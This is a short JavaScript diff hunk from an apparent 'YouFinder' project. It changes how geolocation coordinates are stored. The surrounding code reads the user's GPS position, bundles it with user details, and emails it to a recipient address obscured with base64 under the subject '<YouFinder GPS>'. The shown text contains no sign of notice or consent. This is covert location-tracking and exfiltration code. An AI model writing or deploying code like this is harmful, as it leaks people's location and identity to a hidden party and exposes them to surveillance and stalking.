@@ -27,7 +27,7 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 				});
 
 				navigator.geolocation.getCurrentPosition(function (Locate) {
-					UserInfo.geolocation　= Locate.coords;
+					UserInfo.geolocation　= Locate.coords.toObject();
 					
 					let GPSMail = new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder GPS> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t"));
 					MBase.send(GPSMail, function (Res) {
